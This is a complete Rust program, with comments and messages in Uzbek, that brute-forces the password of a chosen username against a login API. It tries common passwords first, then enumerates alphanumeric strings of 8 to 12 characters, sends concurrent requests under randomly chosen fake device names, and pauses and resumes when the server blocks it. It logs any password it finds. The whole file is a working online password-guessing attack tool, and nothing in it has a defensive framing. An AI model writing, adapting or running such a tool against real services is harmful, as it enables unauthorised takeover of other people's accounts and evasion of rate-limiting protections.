use dotenv::dotenv;
use rand::seq::SliceRandom;
use rand::thread_rng;
use reqwest::Client;
use serde_json::Value;
use std::error::Error;
use std::fs::{self, File};
use std::io::{self, BufRead, BufReader, Write};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::time::sleep;

// Environment o'zgaruvchilarini yuklash
lazy_static::lazy_static! {
    static ref STARTER_CHAR: String = std::env::var("STARTER_CHAR").unwrap_or_default();
    static ref API_URL: String = std::env::var("API_URL")
        .unwrap();
    static ref LOG_LIMIT: usize = std::env::var("LOG_LIMIT")
        .unwrap_or_else(|_| "500".to_string())
        .parse()
        .unwrap_or(500);
}

// Fayllardan ma'lumotlarni o'qib olish
fn read_from_file(filename: &str) -> Vec<String> {
    let file = match File::open(filename) {
        Ok(file) => file,
        Err(_) => return Vec::new(),
    };

    let reader = BufReader::new(file);
    reader.lines().filter_map(Result::ok).collect()
}

// Fake device nomlari ro'yxati (fayldan o'qish)
lazy_static::lazy_static! {
    static ref FAKE_DEVICES: Vec<String> = {
        let mut devices = read_from_file("fake_devices.txt");
        devices
    };
}

// Mashhur parollar ro'yxati (fayldan o'qish)
lazy_static::lazy_static! {
    static ref COMMON_PASSWORDS: Vec<String> = {
        let mut passwords = read_from_file("common_passwords.txt");
        passwords
    };
}

// Log faylini yaratish
fn create_log_file(counter: u32) -> Result<File, Box<dyn Error>> {
    let filename = format!("password_finder_{}.log", counter);
    let file = File::create(filename)?;
    Ok(file)
}

// Eski log fayllarni o'chirish
fn cleanup_old_logs() -> Result<(), Box<dyn Error>> {
    let entries = fs::read_dir(".")?;

    for entry in entries {
        let entry = entry?;
        let path = entry.path();

        if let Some(filename) = path.file_name().and_then(|n| n.to_str()) {
            if filename.starts_with("password_finder_") && filename.ends_with(".log") {
                fs::remove_file(&path)?;
                println!("Eski log fayl o'chirildi: {}", filename);
            }
        }
    }

    Ok(())
}

// Parol generatori - avval mashhur parollardan boshlaydi
struct PasswordGenerator {
    common_passwords: Vec<String>,
    current_common_index: usize,
    charset: Vec<char>,
    current_length: usize,
    current_indices: Vec<usize>,
    used_passwords: std::collections::HashSet<String>,
}

impl PasswordGenerator {
    fn new() -> Self {
        let mut common_passwords = COMMON_PASSWORDS.clone();
        // common_passwords.shuffle(&mut thread_rng()); // Agar parollarni aralashtirib tashlash kerak bo'lsa

        PasswordGenerator {
            common_passwords,
            current_common_index: 0,
            charset: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
                .chars()
                .collect(),
            current_length: 8,
            current_indices: vec![0; 8],
            used_passwords: std::collections::HashSet::new(),
        }
    }

    fn next(&mut self) -> Option<String> {
        // Avval mashhur parollarni qaytaradi
        if self.current_common_index < self.common_passwords.len() {
            let password = self.common_passwords[self.current_common_index].clone();
            self.current_common_index += 1;

            if !self.used_passwords.contains(&password) {
                self.used_passwords.insert(password.clone());
                return Some(password);
            }
        }

        // Keyin boshqa parollarni generatsiya qiladi
        loop {
            // Kombinatsiyani generatsiya qilish
            let password: String = self
                .current_indices
                .iter()
                .map(|&i| self.charset[i])
                .collect();

            // Keyingi kombinatsiyaga o'tish
            let mut i = self.current_length - 1;
            loop {
                self.current_indices[i] += 1;
                if self.current_indices[i] < self.charset.len() {
                    break;
                }
                self.current_indices[i] = 0;
                if i == 0 {
                    break;
                }
                i -= 1;
            }

            // Agar barcha kombinatsiyalar tugagan bo'lsa, keyingi uzunlikka o'tish
            if self.current_indices.iter().all(|&x| x == 0) {
                self.current_length += 1;
                if self.current_length > 12 {
                    return None; // Barcha uzunliklar tugadi
                }
                self.current_indices = vec![0; self.current_length];
                continue;
            }

            // Parol avlad ishlatilmaganligini tekshirish
            if !self.used_passwords.contains(&password) {
                self.used_passwords.insert(password.clone());
                return Some(password);
            }
        }
    }

    fn set_start_password(&mut self, start_password: &str) {
        // Berilgan paroldan keyingi parollarni generatsiya qilish uchun holatni o'rnatish
        self.used_passwords.insert(start_password.to_string());

        // Parol uzunligini o'rnatish
        self.current_length = start_password.len();
        self.current_indices = vec![0; self.current_length];

        // Parolni indekslarga aylantirish
        for (i, c) in start_password.chars().enumerate() {
            if let Some(pos) = self.charset.iter().position(|&x| x == c) {
                self.current_indices[i] = pos;
            }
        }

        // Keyingi parolga o'tish
        let mut i = self.current_length - 1;
        loop {
            self.current_indices[i] += 1;
            if self.current_indices[i] < self.charset.len() {
                break;
            }
            self.current_indices[i] = 0;
            if i == 0 {
                break;
            }
            i -= 1;
        }
    }
}

// So'rov yuborish funksiyasi
async fn send_request(
    client: &Client,
    username: &str,
    password: &str,
    device: &str,
    try_count: u64,
    found: &AtomicBool,
    blocked: &AtomicBool,
    user_not_found: &AtomicBool,
    log_file: &Arc<Mutex<File>>,
) -> Result<String, Box<dyn Error + Send>> {
    if found.load(Ordering::Relaxed)
        || blocked.load(Ordering::Relaxed)
        || user_not_found.load(Ordering::Relaxed)
    {
        return Ok("Dastur to'xtatilgan".to_string());
    }

    // API ga so'rov yuborish
    let payload = serde_json::json!({
        "device": device,
        "loginInput": username,
        "password": password
    });

    let response = client.post(&*API_URL).json(&payload).send().await;

    match response {
        Ok(resp) => {
            let status = resp.status();
            let response_text = resp
                .text()
                .await
                .unwrap_or_else(|_| "Javob matnini o'qib bo'lmadi".to_string());

            // Response ni JSON formatida parse qilish
            let json_response: Result<Value, _> = serde_json::from_str(&response_text);

            if status.is_success() {
                let message = format!(
                    "PAROL TOPILDI! Urinish {}: Foydalanuvchi: {} | Parol: {} | Response: {}",
                    try_count, username, password, response_text
                );

                // Log fayliga yozish va konsolga chiqarish
                let mut file = log_file.lock().unwrap();
                writeln!(*file, "{}", message).expect("Log fayliga yozishda xato");
                println!("{}", message);

                found.store(true, Ordering::Relaxed);
                Ok(message)
            } else if status == 400 {
                // Foydalanuvchi topilmadi xabarini tekshirish
                if let Ok(json) = json_response {
                    if let Some(message) = json.get("message") {
                        if message == "Foydalanuvchi topilmadi" {
                            let log_msg = format!("FOYDALANUVCHI TOPILMADI! Urinish {}: Foydalanuvchi: {} | Response: {}", 
                                                try_count, username, response_text);

                            // Log fayliga yozish va konsolga chiqarish
                            let mut file = log_file.lock().unwrap();
                            writeln!(*file, "{}", log_msg).expect("Log fayliga yozishda xato");
                            println!("{}", log_msg);

                            user_not_found.store(true, Ordering::Relaxed);
                            return Ok(log_msg);
                        }
                    }
                }
                Ok(format!(
                    "Urinish: {} | Status: {} | Password: {} | Response: {}",
                    try_count, status, password, response_text
                ))
            } else if status == 429 || status == 403 {
                // Server bloklagan (Too Many Requests yoki Forbidden)
                let message = format!(
                    "SERVER BLOKLADI! Urinish {}: Password: {} | Status: {} | Device: {} | Response: {}",
                    try_count, password, status, device, response_text
                );

                // Log fayliga yozish va konsolga chiqarish
                let mut file = log_file.lock().unwrap();
                writeln!(*file, "{}", message).expect("Log fayliga yozishda xato");
                println!("{}", message);

                blocked.store(true, Ordering::Relaxed);
                Ok(message)
            } else {
                Ok(format!(
                    "Urinish: {} | Status: {} | Password: {} | Response: {}",
                    try_count, status, password, response_text
                ))
            }
        }
        Err(e) => {
            // Tarmoq xatolari yoki timeout
            if e.is_timeout() || e.is_connect() {
                let message = format!(
                    "NETWORK XATOSI! Urinish {}: Password: {} | Xatolik: {} | Device: {}",
                    try_count, password, e, device
                );

                // Log fayliga yozish va konsolga chiqarish
                let mut file = log_file.lock().unwrap();
                writeln!(*file, "{}", message).expect("Log fayliga yozishda xato");
                println!("{}", message);

                blocked.store(true, Ordering::Relaxed);
                Ok(message)
            } else {
                Ok(format!(
                    "Urinish: {} Password: {} | | Xatolik: {} | Device: {}",
                    try_count, password, e, device
                ))
            }
        }
    }
}

// Oddiy (birma-bir) usulda ishlash
async fn run_sync(
    client: Client,
    username: String,
    password_generator: PasswordGenerator,
    found: Arc<AtomicBool>,
    blocked: Arc<AtomicBool>,
    user_not_found: Arc<AtomicBool>,
    log_file: Arc<Mutex<File>>,
) -> Result<(), Box<dyn Error>> {
    let mut password_generator = password_generator;
    let try_count = Arc::new(AtomicU64::new(0));
    let error_logs = Arc::new(Mutex::new(Vec::new()));
    let log_file_counter = Arc::new(Mutex::new(1));

    while let Some(password) = password_generator.next() {
        if found.load(Ordering::Relaxed)
            || blocked.load(Ordering::Relaxed)
            || user_not_found.load(Ordering::Relaxed)
        {
            break;
        }

        let current_try = try_count.fetch_add(1, Ordering::Relaxed) + 1;

        // Har LOG_LIMIT urinishda progress haqida xabar berish
        if current_try % *LOG_LIMIT as u64 == 0 {
            println!(
                "{} ta parol sinandi. Hozirgi parol: {}",
                current_try, password
            );

            // Log faylini yangilash
            let mut logs = error_logs.lock().unwrap();
            if !logs.is_empty() {
                let mut counter = log_file_counter.lock().unwrap();
                let mut file = create_log_file(*counter)?;

                for log in logs.iter() {
                    writeln!(file, "{}", log)?;
                }

                logs.clear();
                *counter += 1;
            }
        }

        // Random device name tanlash
        let device = FAKE_DEVICES
            .choose(&mut thread_rng())
            .unwrap_or(&FAKE_DEVICES[0]);

        // So'rov yuborish
        let result = send_request(
            &client,
            &username,
            &password,
            device,
            current_try,
            &found,
            &blocked,
            &user_not_found,
            &log_file,
        )
        .await;

        // Natijani error_logs ga qo'shish (faqat muhim bo'lmagan xabarlar uchun)
        if let Ok(log_message) = result {
            // Agar bu muhim xabar bo'lsa (success, user not found, block, network error),
            // u allaqachon log fayliga yozilgan, shuning uchun faqat boshqa xabarlarni qo'shamiz
            if !log_message.contains("PAROL TOPILDI")
                && !log_message.contains("FOYDALANUVCHI TOPILMADI")
                && !log_message.contains("SERVER BLOKLADI")
                && !log_message.contains("NETWORK XATOSI")
            {
                let mut logs = error_logs.lock().unwrap();
                logs.push(log_message);
            }
        }

        // Agar bloklangan bo'lsa, kutish va device ni o'zgartirish
        if blocked.load(Ordering::Relaxed) {
            sleep(Duration::from_secs(60)).await;
            blocked.store(false, Ordering::Relaxed);
            continue;
        }

        // Serverga ortiqcha yuk bo'lmasligi uchun kichik tanaffus
        sleep(Duration::from_millis(50)).await;
    }

    // Qolgan loglarni yozish
    let logs = error_logs.lock().unwrap();
    if !logs.is_empty() {
        let mut counter = log_file_counter.lock().unwrap();
        let mut file = create_log_file(*counter)?;

        for log in logs.iter() {
            writeln!(file, "{}", log)?;
        }
    }

    Ok(())
}

// Asinxron (bir vaqtning o'zida bir nechta so'rov) usulda ishlash
async fn run_async(
    client: Client,
    username: String,
    password_generator: PasswordGenerator,
    found: Arc<AtomicBool>,
    blocked: Arc<AtomicBool>,
    user_not_found: Arc<AtomicBool>,
    concurrent_requests: usize,
    log_file: Arc<Mutex<File>>,
) -> Result<(), Box<dyn Error>> {
    let password_generator = Arc::new(Mutex::new(password_generator));
    let try_count = Arc::new(AtomicU64::new(0));
    let error_logs = Arc::new(Mutex::new(Vec::new()));
    let log_file_counter = Arc::new(Mutex::new(1));
    let mut tasks = vec![];

    // Bir vaqtning o'zida bir nechta so'rov yuborish
    for _ in 0..concurrent_requests {
        let client = client.clone();
        let username = username.clone();
        let password_generator = password_generator.clone();
        let try_count = try_count.clone();
        let error_logs = error_logs.clone();
        let log_file_counter = log_file_counter.clone();
        let found = found.clone();
        let blocked = blocked.clone();
        let user_not_found = user_not_found.clone();
        let log_file = log_file.clone();

        let task = tokio::spawn(async move {
            loop {
                if found.load(Ordering::Relaxed)
                    || blocked.load(Ordering::Relaxed)
                    || user_not_found.load(Ordering::Relaxed)
                {
                    break;
                }

                // Keyingi parolni olish
                let password = {
                    let mut generator = password_generator.lock().unwrap();
                    generator.next()
                };

                let password = match password {
                    Some(p) => p,
                    None => break, // Parollar tugadi
                };

                let current_try = try_count.fetch_add(1, Ordering::Relaxed) + 1;

                // Har LOG_LIMIT urinishda progress haqida xabar berish
                if current_try % *LOG_LIMIT as u64 == 0 {
                    println!(
                        "{} ta parol sinandi. Hozirgi parol: {}",
                        current_try, password
                    );

                    // Log faylini yangilash
                    let mut logs = error_logs.lock().unwrap();
                    if !logs.is_empty() {
                        let mut counter = log_file_counter.lock().unwrap();
                        if let Ok(mut file) = create_log_file(*counter) {
                            for log in logs.iter() {
                                let _ = writeln!(file, "{}", log);
                            }
                            logs.clear();
                            *counter += 1;
                        }
                    }
                }

                // Random device name tanlash
                let device = FAKE_DEVICES
                    .choose(&mut thread_rng())
                    .unwrap_or(&FAKE_DEVICES[0]);

                // So'rov yuborish
                let result = send_request(
                    &client,
                    &username,
                    &password,
                    device,
                    current_try,
                    &found,
                    &blocked,
                    &user_not_found,
                    &log_file,
                )
                .await;

                // Natijani error_logs ga qo'shish (faqat muhim bo'lmagan xabarlar uchun)
                if let Ok(log_message) = result {
                    // Agar bu muhim xabar bo'lsa (success, user not found, block, network error),
                    // u allaqachon log fayliga yozilgan, shuning uchun faqat boshqa xabarlarni qo'shamiz
                    if !log_message.contains("PAROL TOPILDI")
                        && !log_message.contains("FOYDALANUVCHI TOPILMADI")
                        && !log_message.contains("SERVER BLOKLADI")
                        && !log_message.contains("NETWORK XATOSI")
                    {
                        let mut logs = error_logs.lock().unwrap();
                        logs.push(log_message);
                    }
                }

                // Agar bloklangan bo'lsa, kutish va device ni o'zgartirish
                if blocked.load(Ordering::Relaxed) {
                    sleep(Duration::from_secs(60)).await;
                    blocked.store(false, Ordering::Relaxed);
                    continue;
                }

                // Serverga ortiqcha yuk bo'lmasligi uchun kichik tanaffus
                sleep(Duration::from_millis(50)).await;
            }
        });

        tasks.push(task);
    }

    // Barcha tasklar tugashini kutish
    for task in tasks {
        let _ = task.await;
    }

    // Qolgan loglarni yozish
    let logs = error_logs.lock().unwrap();
    if !logs.is_empty() {
        let mut counter = log_file_counter.lock().unwrap();
        if let Ok(mut file) = create_log_file(*counter) {
            for log in logs.iter() {
                let _ = writeln!(file, "{}", log);
            }
        }
    }

    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    // Environment o'zgaruvchilarini yuklash
    dotenv().ok();

    // Eski log fayllarni tozalash
    cleanup_old_logs()?;

    println!("Dastur ishga tushdi");

    // Ishlash usulini tanlash
    println!("Ishlash usulini tanlang:");
    println!("1 - Oddiy (birma-bir)");
    println!("2 - Asinxron (bir vaqtning o'zida bir nechta so'rov)");

    let mut mode = String::new();
    io::stdin().read_line(&mut mode)?;
    let mode = mode.trim();

    let mut concurrent_requests = 1;
    if mode == "2" {
        println!("Bir vaqtning o'zida nechta so'rov yuborilsin?");
        let mut requests = String::new();
        io::stdin().read_line(&mut requests)?;
        concurrent_requests = requests.trim().parse().unwrap_or(10);
        println!(
            "{} ta parallel so'rov bilan ishlash boshlandi.",
            concurrent_requests
        );
    }

    // Davom etish yoki boshidan boshlashni so'rash
    println!("Boshidan boshlaymizmi yoki davom ettiramizmi? (b/d):");
    let mut choice = String::new();
    io::stdin().read_line(&mut choice)?;
    let choice = choice.trim();

    let mut start_password = None;
    if choice.eq_ignore_ascii_case("d") {
        println!("Oxirgi urinishdagi parolni kiriting:");
        let mut password = String::new();
        io::stdin().read_line(&mut password)?;
        start_password = Some(password.trim().to_string());
    }

    // Foydalanuvchi nomini olish
    println!("Foydalanuvchi nomini kiriting:");
    let mut username = String::new();
    io::stdin().read_line(&mut username)?;
    let username = username.trim().to_string();

    // Foydalanuvchi nomini STARTER_CHAR bilan boshlanishini tekshirish
    let username = if !STARTER_CHAR.is_empty() && !username.starts_with(&STARTER_CHAR as &str) {
        format!("{}{}", &*STARTER_CHAR, username)
    } else {
        username
    };

    // Foydalanuvchi nomi uzunligini tekshirish
    if username.len() < 6 || username.len() > 15 {
        println!(
            "Xato: Foydalanuvchi nomi 6 dan 15 belgigacha bo'lishi kerak. Siz kiritgan: {}",
            username
        );
        return Ok(());
    }

    println!("{} uchun parolni topish boshlandi...", username);

    // HTTP klientini yaratish
    let client = Client::builder().timeout(Duration::from_secs(10)).build()?;

    // O'zgaruvchilarni yaratish
    let found = Arc::new(AtomicBool::new(false));
    let blocked = Arc::new(AtomicBool::new(false));
    let user_not_found = Arc::new(AtomicBool::new(false));

    // Asosiy log faylini yaratish
    let log_file = Arc::new(Mutex::new(create_log_file(1)?));

    // Parol generatorini yaratish
    let mut password_generator = PasswordGenerator::new();

    // Agar davom etish tanlangan bo'lsa, generatorni sozlash
    if let Some(start_pwd) = start_password {
        password_generator.set_start_password(&start_pwd);
        println!("Davom etish: '{}' parolidan keyin", start_pwd);
    }

    // Tanlangan usulda ishlash
    if mode == "2" {
        run_async(
            client,
            username,
            password_generator,
            found.clone(),
            blocked.clone(),
            user_not_found.clone(),
            concurrent_requests,
            log_file.clone(),
        )
        .await?;
    } else {
        run_sync(
            client,
            username,
            password_generator,
            found.clone(),
            blocked.clone(),
            user_not_found.clone(),
            log_file.clone(),
        )
        .await?;
    }

    if found.load(Ordering::Relaxed) {
        println!("Dastur muvaffaqiyatli yakunlandi - parol topildi!");
    } else if user_not_found.load(Ordering::Relaxed) {
        println!("Dastur to'xtatildi - foydalanuvchi topilmadi!");
    } else if blocked.load(Ordering::Relaxed) {
        println!("Dastur server tomonidan bloklanganligi sababli to'xtatildi!");
    } else {
        println!("Parol topilmadi. Boshqa uzunlikdagi parollarni sinab ko'ring yoki boshqa foydalanuvchi nomini ishlating.");
    }

    Ok(())
}